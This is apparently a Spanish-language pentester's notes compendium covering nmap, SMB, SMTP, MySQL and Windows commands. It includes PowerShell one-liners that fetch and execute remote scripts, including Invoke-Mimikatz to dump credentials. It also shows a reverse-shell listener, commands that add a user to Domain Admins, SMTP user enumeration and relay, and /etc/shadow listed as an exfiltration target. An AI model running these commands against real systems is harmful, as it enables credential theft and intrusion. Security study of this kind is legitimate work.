# Pentest
Un compendio de notas sobre pentest.

Todo está aquí, excepto los temas que tienen su propio archivo:
+ [docker.md](docker.md)
+ [hacking_android.md](hacking_android.md)
+ [hacking_ios.md](hacking_ios.md)
+ [hacking_web.md](hacking_web.md)
+ [hardware.md](hardware.md)
+ [wifi.md](wifi.md)

************************************************************************************************
# Análisis de binarios
## 32 bits vs 64 bits

Se abre el binario con un visor hexadecimal y se busca lo siguiente:

Si es de 32 bits
+ PL
+ 50 45 00 00 4C

Si es de 64 bits
+ PE..dt
+ 50 45 00 00 64 86


************************************************************************************************
# Apache

## Obtener versiones
+ curl
+ netcat
+ telnet

~~~bash
curl -I http://google.com

~~~


## Enumerar carpetas (dirb)
+ dirb
+ gobuster
+ nmap

~~~bash
# Enumerar carpetas con dirb
dirb http://sitio.com -o output_file.txt

# Enumerar carpetas con nmap
nmap -P0 -p80 --script http-enum 127.0.0.1
~~~

## Dirbfile
~~~bash
# clonar repositorio
git clone https://github.com/elcaza/dirbfile.git

# Uso
./dirbfile file
~~~

************************************************************************************************
# Exfiltración de información
## Linux

### Archivos importantes
+ /etc/passwd
+ /etc/shadow
+ /etc/resolv.conf
+ /etc/hosts
+ /etc/hostname

### Comprimir información 
~~~bash
# Respaldo omitiendo erroes, tipos de archivos y carpetas
tar --warning=no-file-changed --exclude={*.mp4,*.mp3,'./public_html'} --ignore-failed-read -zcvf respaldo.tar.gz .
~~~

### Conseguir información
~~~bash

~~~

************************************************************************************************
# Hashes
## Información de hashesh
* https://rhash.sourceforge.net/hashes.php#:~:text=The%2032%2Dbit%20long%20hash,in%20the%20EDonkey%20p2p%20network.


************************************************************************************************
# Herramientas útiles

## CRACKMAPEXEC

~~~bash
# Enumerar dominio
crackmapexec smb 10.10.10.10

# Comprobar contraseñas
crackmapexec smb 10.10.10.10 -u 'user' -p 'password'

# Ver recursos compartidos
crackmapexec smb 10.10.10.10 -u 'user' -p 'password' --shares
~~~

## Crunch
Herramienta para crear diccionarios

### Instalación
~~~bash
sudo apt install crunch
~~~

### Uso
~~~bash
# crunch <min> <max> <charset> 
crunch 3 6 0123456789 -o list.txt
crunch 4 8 123abcdefgh#$% -o list2.txt
~~~

### More info
+ https://www.geeksforgeeks.org/create-custom-wordlists-using-crunch-in-kali-linux/
+ https://www.hackers-arise.com/post/creating-a-custom-wordlist-with-crunch

## Cyberchef
Un montón de herramientas para códificar/decodificar
+ https://gchq.github.io/CyberChef/

## smbmap
~~~bash
# Ver recursos compartidos
smbmap -H 10.10.10.10

# Leer algún recurso compartido (preivamente sale)
smbmap -H 10.10.10.10 -r Nombre_recurso

# Descargar un recurso
smbmap -H 10.10.10.10 --download Nombre_recurso

# Leer carpetas/archivos con credenciales
smbmap 10.10.10.10 -u 'user' -p 'password' -r Carpeta
~~~

## Ngrok
+ https://ngrok.com/

## Passwords
~~~bash
cat passwords_burp.txt | (while read password; do echo -n "carlos" | (while read USERS; do echo $USERS:$password; done); done) > eyewitness.txt
~~~

************************************************************************************************
# Kioscos Windows

## Comandos útiles
~~~bash
# usuario local
whoami

# hostname
hostname

# version de windows
winver

# Visor de eventos
eventvwr
~~~

************************************************************************************************
# LDAP

## ldap
~~~bash
ldapsearch -h 192.168.100.1 -x -s base namingcontexts
~~~
+ https://bmaupin.github.io/wiki/applications/misc/ldapsearch.html


************************************************************************************************
# Linux

## Administración básica
~~~bash
# Crear un grupo
groupadd grupo

# Crear usuarios
    # adduser => Script
    # useradd => Manual

useradd -ms /bin/bash superadmin
# -m Crea carpeta home
# -s Asigna shell

# Añadir un usuario a grupo
usermod -a -G sudo soporte

# Cambia password
passwd superadmin

# Variable path
export PATH=$PATH:/new_route
export PATH=new_route:$PATH

## Agregamos contraseña al usuario appuser
RUN echo 'user:password' | chpasswd

~~~

### Información del sistema
~~~bash
# Check system version
lsb_release -a
cat /etc/issue
cat /etc/os-release
hostnamectl
~~~

### Teclado
~~~bash
# 1) Configurar teclado
dpkg-reconfigure keyboard-configuration

# 2) Aplicar la configuración del teclado (solo funciona para esa sesión)
setupcon

# 3) Para un cambio permantente
dpkg-reconfigure console-setup
~~~

## Descargar archivos

### wget

~~~bash
# Descarga un archivo
wget <URL>

# Descarga y renombra un archivo
wget -O <filename> <URL>

# Descarga varios archivos desde un archivo de texto con las urls
wget -i download_files.txt

# Descarga una carpeta
wget -r ftp://server-address.com/directory

# Descargar de manera recursiva esos elementos
wget -nd -r -A pdf,doc,docx,xls,xlsx,jpg www.rediris.es
~~~

### curl

~~~bash
# Descarga un archivo
curl -O URL
curl -O URL1 URL2 URL3

# Descarga y renombra un archivo
curl -o filename URL
~~~


************************************************************************************************
# Metasploit
## Logs
Problema:
+ La salida de los comandos en metasploit nos es procesable con << |  >>
    + Por ejemplo la salida de enum_ssh para filtrar únicamente los usuarios validos

Con spool puedes definir un lugar en que se guardarán todo lo que imprima en pantalla metasploit

~~~bash
# Apagar los logs
spool off

# Añadir una ruta en que se harán los logs
spool /ruta/para/guardar.log

# Si lo quieres tener por siempre 
spool /home/<username>/.msf3/logs/console.log
~~~

Más información:
+ https://blog.rapid7.com/2011/06/25/metasploit-framework-console-output-spooling/


************************************************************************************************
# nmap

## Metodología

~~~bash
simple (nmap 2000-10000)
    1. simple
        nmap -vvv -Pn --max-retries 1 --top-ports 10000 -iL ips.txt -oA s1_proyecto_10000 
        correr: script para sacar puertos únicos
    2. simple de versiones
        nmap -vvv -sV -Pn --max-retries 1 -p <list_ports> -iL ips.txt -oA s2_sv_proyecto_10000
    3. simple de vulnes
        nmap -vvv -sV -sC -Pn --max-retries 1 -p <list_ports> -iL ips.txt -oA s3_sv_sc_proyecto_10000 
        correr: script para remover puertos filtrados

completo (all)
    1. completo
        nmap -vvv -Pn --max-retries 1 -p- -iL ips.txt -oA c1_proyecto_all 
        correr: script para sacar puertos únicos
    2. completo de versiones
        nmap -vvv -sV -Pn --max-retries 1 -p <list_ports> -iL ips.txt -oA c2_sv_proyecto_all
    3. completo de vulnes
        nmap -vvv -sV -sC -Pn --max-retries 1 -p <list_ports> -iL ips.txt -oA c3_sv_sc_proyecto_10000 

script para sacar puertos únicos
    cat file.nmap  | grep open | cut -d "/" -f1 | sort -u | tr "\n" "," && echo;

script para remover puertos filtrados
    sed '/filtered/d' c2_sv_sc_proyecto_all.nmap  > f2_sv_sc_proyecto_all.nmap
    sed '/filtered/d' c3_sv_sc_proyecto_all.nmap  > f3_sv_sc_proyecto_all.nmap

UDP
    1. simple
        nmap -vvv -sU -Pn --max-retries 1 --top-ports 10000 -iL ips.txt -oA s1_udp_proyecto_10000 
    2. simple de versiones
        nmap -vvv -sU -sV -Pn --max-retries 1 -p <list_ports> -iL ips.txt -oA s2_udp_sv_proyecto_10000
    3. simple de vulnes
        nmap -vvv -sU -sV -sC -Pn --max-retries 1 -p <list_ports> -iL ips.txt -oA s3_udp_sv_sc_proyecto_10000 


otros
    cat f2_sv_proyecto_all.nmap | grep open | sort -u
~~~

## Secuencia

1. Corroborar que el host esté arriba, considerar omitir la resolución DNS
    + Puede ser con o sin ping
2. Detección única de puertos (Sin versiones ni nada)
3. Detección de versiones y vulnerabilidades 

## Escaneo de un segmento de red
~~~bash
# Escanear un segmento de red
nmap -sn 172.27.48.0/24

# Escanear un segmento de red (varias ips)
nmap -sn 172.27.253.0/24 172.27.252.0/29
~~~

## Descubrimiento rápido
~~~bash
# Escaneo a top ports
nmap --max-retries 0 --top-ports 5000 site.com 
# Escaneo a todos los puertos
nmap --max-retries 0 -p- site.com
# Escaneo a top ports pero sin hacer ping, toma todos los hosts como vivos
nmap --max-retries 0 --top-ports 5000 -P0 site.com 
# Escaneo a top ports pero sin hacer ping, toma todos los hosts como vivos
nmap --max-retries 0 --top-ports 5000 -Pn site.com 
~~~

## Detección de versiones y vulnerabilidades
~~~bash
# Sintaxis básica
nmap --max-retries -p 22,80,443,3000 -sV

# -sV => Mostrar versiones
# -O => Identifica S.O.
# -p => Define el puerto

# Identifica vulnerabilidades
nmap -sV -p80,443 --script=vulners ip

# Identifica vulnerabilidades por puerto asociado
nmap -p80,8080 –sV –sC ip
# -sC => Scripts de vulnerabilidades acorde al puerto analizado

# Busca vulnerabilidades
nmap 192.160.100.1 -Pn -sCV

# Realizar escaneo completo a los puertos determinados
nmap -A -p80,443 ip
~~~

## Escaneo UDP
~~~bash
# Escaneo a puertos UDP
nmap -sU 172.24.16.25
~~~

## Scripts

~~~bash
# Actualiza la BD de scripts
nmap --script-updatedb

# Localiza los scripts de nmap
locate nse | grep script

# Ayuda sobre el script
nmap --script-help=nombre_scrip
~~~

Más información:
+ https://linuxhint.com/stealth_scans_nmap/

************************************************************************************************
# Pretty shell

## rlwrap (Historial de comandos)
~~~bash
# Instala rlwrap
sudo apt install rlwrap

# Para capturar la reverse shell
rlwrap nc -lp 5000
~~~

## Python pretty shell
~~~bash
# Una vez que tienes la conexión
python -c "import pty; pty.spawn('/bin/bash')"

# Otra opción es
python -c "import pty; pty.spawn('/bin/sh')"
~~~



************************************************************************************************
# Python
## Servidores web

~~~python
# Python 3
python3 -m http.server 8000

# Python 2
python -m SimpleHTTPServer 7777
~~~
# SQL

## Asignar permisos
~~~bash
GRANT ALL PRIVILEGES ON mi_base_de_datos.* TO mi_usuario@localhost;
FLUSH PRIVILEGES;
~~~

## Borrar base de datos
~~~bash
DROP DATABASE base_de_datos;
~~~

## Cambiar password de usuarios sin conocer el password
~~~bash
# Ver versión mysql/mariadb
mysql --version

# Detener mysql
sudo systemctl stop mysql

# Iniciar MySQL sin seguridad
sudo mysqld_safe --skip-grant-tables --skip-networking &

# Iniciar sesión sin contraseña
mysql -u root

# Cambiar password 
FLUSH PRIVILEGES;
ALTER USER 'root'@'localhost' IDENTIFIED BY 'new_password';

# Otra opción
SET PASSWORD FOR 'root'@'localhost' = PASSWORD('new_password');
~~~

## Ingresar a SQL
~~~bash
sudo mysql -p
~~~

## Listar usuarios
~~~bash
# Listar usuarios en MySQL
SELECT user FROM mysql.user;

# Listar usuarios y hosts
SELECT user,host FROM mysql.user;

# Listar usuarios, hosts y password
SELECT user,host,password FROM mysql.user;

# Show Current and Current Logged Users
SELECT current_user();

# If you need more information, you can modify the query to display currently logged-in users with their states
SELECT user,host, command FROM information_schema.processlist;

~~~

## Listar Bases de datos y ver permisos
~~~bash
# Ver bases de datos
SHOW DATABASES;
SHOW SCHEMAS;
~~~

## Listar permisos
~~~bash
# Ver permisos de una BD en especifico
SELECT user,host from mysql.db where db='DB_NAME';

# Ver privilegios de todos los usuarios
SELECT user, host, password, select_priv, insert_priv, shutdown_priv, grant_priv FROM mysql.user;

# Ver permisos para BD individuales
SELECT user, host, db, select_priv, insert_priv, grant_priv FROM mysql.db;

# Ver privilegios
SHOW grants;
~~~

## Respaldar una BD
~~~bash
# Crear respaldo de la BD
mysqldump -u nombre_usuario -p nombre_bbdd > nombre_archivo_dump.sql
~~~

## Importar una BD
~~~bash
# Crear una nueva base de datos
CREATE DATABASE nueva_bbdd;

# Importar una BD
mysql -u nombre_usuario -p nueva_bbdd < nombre_archivo_dump.sql;
~~~

## Referencias:
+ https://www.hostinger.com/tutorials/mysql-show-users/#:~:text=2.-,Use%20the%20MySQL%20SHOW%20USERS%20Query,have%20been%20created%20in%20MySQL.
+ https://www.digitalocean.com/community/tutorials/how-to-reset-your-mysql-or-mariadb-root-password



************************************************************************************************
# RPC (135)

## Script de Python
+ https://github.com/SecureAuthCorp/impacket/blob/master/examples/rpcdump.py

~~~bash
./rpcdump.py 192.168.100.1
~~~


************************************************************************************************
# SMB (Server Message Block)

## Detalles
+ Puerto 445
+ Versión SMB 1.0 => Conexión anónima permitida
+ Windows 2008 en adelante no hay conexión anónima
    + La versión SMB 1.0 podría estar habilitada por compatibilidad

## Autenticación
~~~bash
# Autenticación anónima
smbclient -L 172.27.30.30 -N
    # Caso deshabilitado
    # Anonymous login successful
    # 
    #         Sharename       Type      Comment
    #         ---------       ----      -------
    # SMB1 disabled -- no workgroup available


# Autenticación con usuario y contraseña
# % separa el usuario del password
smbclient -L 172.27.30.30 -U 'user%password'
    # Caso login correcto
    # Sharename       Type      Comment                                                                                                                                                                                                
    #    ---------       ----      -------                                                                                                                                                                                                

# Recursos compartidos por defecto   
    #    ADMIN$          Disk      Remote Admin                                                                                                                                                                                           
    #    C$              Disk      Default share                                                                                                                                                                                          
    #    IPC$            IPC       Remote IPC                                                                                                                                                                                             
    
    
    #    NETLOGON        Disk      Logon server share                                                                                                                                                                                     
    #    SYSVOL          Disk      Logon server share

# Recursos compartidos en el caso de usar Windows update                                                                                                                                                                           
    #    UpdateServicesPackages Disk      A network share to be used by client systems for collecting all software packages (usually applications) published on this WSUS system.                                                         
    #    WsusContent     Disk      A network share to be used by Local Publishing to place published content on this WSUS system.                                                                                                         
    #    WSUSTemp        Disk      A network share used by Local Publishing from a Remote WSUS Console Instance.                                                                                                                          
        # SMB1 disabled -- no workgroup available   
~~~

## Entrada a los directorios
~~~bash
# Entrada a los directorios
# Para algunos casos se requiere usuario admin
smbclient //172.27.30.30/WsusContent -U 'user%password'

    # Caso usuario correcto y con privilgios suficientes
    # user:~# smbclient //172.27.30.30/C$ -U 'usuarioadmin%password'
    # Try "help" to get a list of possible commands.
# Una vez en el prompt (smb: \>) usar dir para listar
dir
    # $Recycle.Bin                      DHS        0  Thu Aug 22 11:50:45 2013
    # Documents and Settings            DHS        0  Thu Aug 22 10:48:41 2013
    # File.txt                              DR        0  Wed Sep  8 19:08:52 2021
    # Program Files                      DR        0  Wed Sep  8 20:30:07 2021
    # Program Files (x86)                 D        0  Thu Aug 22 11:39:32 2013
    # ProgramData                        DH        0  Wed Sep  8 19:11:24 2021
    # Users                              DR        0  Wed Sep  8 19:08:52 2021
    # Windows                             D        0  Wed Sep  8 18:52:38 2021

# Para obtener algun archivo get file
get File.txt
    # getting file \File.txt of size 0 as READMe.txt (0.0 KiloBytes/sec) (average 0.0 KiloBytes/sec)

# Para quitar 
quit

#####################
    # Caso usuario correcto y con privilgios insuficientes
    # smbclient //172.27.30.30/WsusContent -U 'user%password'
    # tree connect failed: NT_STATUS_ACCESS_DENIED
~~~

## Para deshabilitar el compartir por defecto mediante llave de registro 
~~~bash
# llave para deshabilitar el autoshare (?)
# dar de alta double word y en valor 0
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\LanManServer\AutoShareWks
~~~

## SMB vulnes nmap
~~~bash
# SMB
nmap 192.168.100.1 -Pn -p 445 -sCV –script vuln
~~~

************************************************************************************************
# SMTP (Simple Mail Transfer Protocol)
Puedes conectarte a través de varias herramientas, por ejemplo:
- netcat
- telnet
## Sacar la configuración del servidor
Requiere que tengas el nombre de dominio, pero este sale en el banner de bienvenida
+ 220 dmzweb.sitio.com ESMTP Sendmail 8.13.5/8.13.5; Mon, 4 Oct 2021 03:20:03 -0400

~~~bash
# Con telnet
telnet 172.27.254.20 25
# Nota el ehlo en lugar de helo
# Sustituir dmzweb.sitio.com por el nombre de dominio
ehlo dmzweb.sitio.com 
    # output
    # 250-dmzweb.sitio.com Hello [172.31.247.18], pleased to meet you
    # 250-ENHANCEDSTATUSCODES
    # 250-PIPELINING
    # 250-EXPN
    # 250-VERB
    # 250-8BITMIME
    # 250-SIZE
    # 250-DSN
    # 250-ETRN
    # 250-DELIVERBY
    # 250 HELP
# Para salir
quit

# Con netcat
nc 172.27.254.20 25
# Nota el ehlo en lugar de helo
# Sustituir dmzweb.sitio.com por el nombre de dominio
ehlo dmzweb.sitio.com 
    # output
    # 250-dmzweb.sitio.com Hello [172.31.247.18], pleased to meet you
    # 250-ENHANCEDSTATUSCODES
    # 250-PIPELINING
    # 250-EXPN
    # 250-VERB
    # 250-8BITMIME
    # 250-SIZE
    # 250-DSN
    # 250-ETRN
    # 250-DELIVERBY
    # 250 HELP
# Para salir
quit
~~~

## Enumerar cuentas de usuarios
~~~bash
nc 172.27.254.20 25
# Nota el helo en lugar de ehlo
helo dmzweb.sitio.com 
# Para enumerar se uso EXPN username
EXPN usuario1
    # Output
    # 550 5.1.1 usuario1... User unknown
EXPN root
    # 250 2.1.5 Nombre Apellido <usuario@dmzweb.sitio.com>
EXPN webmaster
    # 250 2.1.5 Nombre Apellido <usuario@dmzweb.sitio.com>
~~~

## Enviar correos sin autenticación
Tienes que tener una cuenta valida de correo
~~~bash
EXPN root
    # 250 2.1.5 Nombre ap <usuario.servidor@dmzweb.sitio.com>
mail from: usuario.servidor@dmzweb.sitio.com
    # 250 2.1.0 usuario.servidor@dmzweb.sitio.com... Sender ok
rcpt to: user@gmail.com
    # 250 2.1.5 user@gmail.com... Recipient ok
data
    # 354 Enter mail, end with "." on a line by itself
Subject: El asunto
Mensaje del email, terminando con un punto
.
# 250 2.0.0 1947Mnyw018712 Message accepted for delivery

~~~

************************************************************************************************
# Tareas en segundo plano y asincronas

## Con funciones
~~~bash
#!/usr/bin/bash
delayed_curl() {
	url=$1
	callback=$2
	seconds=$3

	sleep $seconds
	curl -s $url || $callback $url
}

loggin_error() {
	echo "error in: $1" >> error.log
}

for delay in 1 5 10; do
	echo $delay
	delayed_curl "www.asjdlfjsdf.com" loggin_error $delay &
	delayed_curl "https://webhook.site/0cd769e1-20ce-4b42-aa10-2e580fef6a26" loggin_error $delay &
done
~~~

## En una sola línea
~~~bash
time sleep 5 && curl -s "https://webhook.site/0cd769e1-20ce-4b42-aa10-2e580fef6a26" && echo "Ready! `date`" & echo "Comenzando (se imprime primero) `date`" 

# Output:
    # [1] 1156018
    # Comenzando (se imprime primero) jue 29 jun 2023 09:11:35 CST
    # real	0m5.002s
    # user	0m0.002s
    # sys	0m0.000s
    # Ready! jue 29 jun 2023 09:11:41 CST
~~~

************************************************************************************************
# Utilerías

## Read a do anything
~~~bash
#!/bin/bash
while IFS= read -r line
do
    user=$(echo $line | cut -d ":" -f1)
    password=$(echo $line | cut -d ":" -f2 | base64 -d | base64 -d)
    echo "$user:$password"
done < $1
~~~

## Insertar caracteres antes de una línea
~~~bash
awk '{print "Insertar al inicio " $0 " insertar al final\n"}' archivo.txt
~~~

## Dividir un archivo en varios
~~~bash
split -l 200000 -d --additional-suffix=.txt input_file.txt output_file
~~~

## Imprimir todo lo que no es comentario
~~~bash
awk '!/#/' file
~~~
Referencias:
+ https://www.unixtutorial.org/awk-delimiter/

## Remover caracteres repetidos
~~~bash
tr -s 'character'
tr -s ' '
tr -s '\n'

~~~ 
## Borrar un caracter de un string
~~~bash
tr -d ".|,"
~~~

## Reemplazar una cadena por nada 
~~~bash
sed "s/|a|//g" 
sed "s/|a|/~b~/g" 
~~~

## Remover la última letra del string
~~~bash
sed 's/.$//'
~~~

## Descargar un archivo con scp
~~~bash
scp user@192.168.100.100:path/file.txt /local/dir
~~~

## Subir un archivo con scp
~~~bash
scp file user@192.168.100.100:path/file.txt
~~~

## Con llave publica
~~~bash
scp -i key_file.pem user@192.168.100.100:path/file.txt /local/dir
~~~

## Control con systemctl
~~~bash
# Systemctl
sudo systemctl status ssh
sudo systemctl start ssh
sudo systemctl stop ssh
sudo systemctl restart ssh

# Preguntar si está activo
sudo systemctl is-active apache

# Preguntar si está habilitado
sudo systemctl is-enable apache
~~~


************************************************************************************************
# WiFi
## Escanear redes
~~~bash
# Ecacenar interfaz
# iwlist <interfaz> scan | grep SSID
iwlist wlan0 scan | grep SSID
    # ESSID:"Red 1"
    # ESSID:"Red 2"
~~~


************************************************************************************************
# Windows
## Descargar archivos

**Requiere administrador**
~~~powershell
# Metodo 1 - Download in PowerShell 2 ^
$WebClient = New-Object System.Net.WebClient
$WebClient.DownloadFile("https://raw.githubusercontent.com/elcaza/pentest/main/README.md","C:\path\file")

# Metodo 2 - Download with Invoke-WebRequest ^
Invoke-WebRequest -Uri "https://raw.githubusercontent.com/elcaza/pentest/main/README.md" -OutFile "C:\path\file"

# Metodo 3 - Download with Invoke-WebRequest ^
wget "https://raw.githubusercontent.com/elcaza/pentest/main/README.md" -outfile "file"
~~~

Más información:
+ https://4sysops.com/archives/use-powershell-to-download-a-file-with-http-https-and-ftp/

## Añadir usuario a Dominio
~~~ powershell
net user username password /ADD /DOMAIN
net group "Domain Admins" username /ADD /DOMAIN
~~~ 

## Ejecutando un living off the land
+ Windows Defender lo detecta como actividad maliciosa

~~~powershell
powershell.exe -exec bypass -C "IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-Mimikatz.ps1');Invoke-Mimikatz -DumpCreds"
~~~

iex ((New-Object System.Net.WebClient).DownloadString('https://git.io/JJ8R4'))

Invoke-Expression (New-Object Net.WebClient).DownloadString('http://192.168.100.59:3000/poc.ps1')


Más información
+ https://lolbas-project.github.io/
+ https://github.com/LOLBAS-Project/LOLBAS
+ https://www.elladodelmal.com/2020/09/windows-amsi-antimalware-scan-interface.html
+ https://docs.microsoft.com/en-us/microsoft-365/security/defender-endpoint/configure-network-connections-microsoft-defender-antivirus?view=o365-worldwide
+ https://docs.microsoft.com/en-us/microsoft-365/security/defender-endpoint/linux-exclusions?view=o365-worldwide
+ https://www.gb-advisors.com/es/mimikatz/#:~:text=Windows%20cuenta%20con%20la%20funcionalidad,la%20clave%20secreta%20para%20descifrarlas.

## Obteniendo datos del sistema

~~~cmd
REM REM = Comentario en CMD
REM Obtener información
systeminfo 
~~~